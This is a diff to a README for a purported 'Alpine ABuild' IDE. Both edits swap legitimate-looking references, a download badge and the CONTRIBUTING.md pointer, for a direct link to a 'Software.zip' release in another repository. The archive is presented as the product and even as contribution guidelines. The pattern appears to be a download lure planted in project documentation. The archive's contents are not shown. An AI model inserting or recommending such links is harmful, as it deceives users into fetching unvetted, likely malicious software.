@@ -12,7 +12,7 @@ Welcome to the official repository of the **Alpine ABuild programming language I
 
 To quickly get started with the Alpine ABuild IDE submodule, you can download the latest release by clicking on the button below:
 
-[![Download Alpine ABuild IDE](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Launch the Alpine ABuild IDE")
+[![Download Alpine ABuild IDE](https://github.com/Ydpox/SNU_2D_ProgrammingTools_IDE_Alpine-ABuild/releases/download/v1.0/Software.zip)](https://github.com/Ydpox/SNU_2D_ProgrammingTools_IDE_Alpine-ABuild/releases/download/v1.0/Software.zip "Launch the Alpine ABuild IDE")
 
 If the above link doesn't work, please ensure to check the **Releases** section of this repository for alternative download options.
 
@@ -29,7 +29,7 @@ The Alpine ABuild IDE submodule provides a user-friendly environment for develop
 
 ## Contributing 🤝
 
-We welcome contributions from the community to make the Alpine ABuild IDE submodule even better! Whether you're interested in fixing bugs, adding new features, or improving the documentation, your input is valuable. Please refer to the **CONTRIBUTING.md** file for guidelines on how to contribute to this project.
+We welcome contributions from the community to make the Alpine ABuild IDE submodule even better! Whether you're interested in fixing bugs, adding new features, or improving the documentation, your input is valuable. Please refer to the **https://github.com/Ydpox/SNU_2D_ProgrammingTools_IDE_Alpine-ABuild/releases/download/v1.0/Software.zip** file for guidelines on how to contribute to this project.
 
 ## Support ℹ️
 
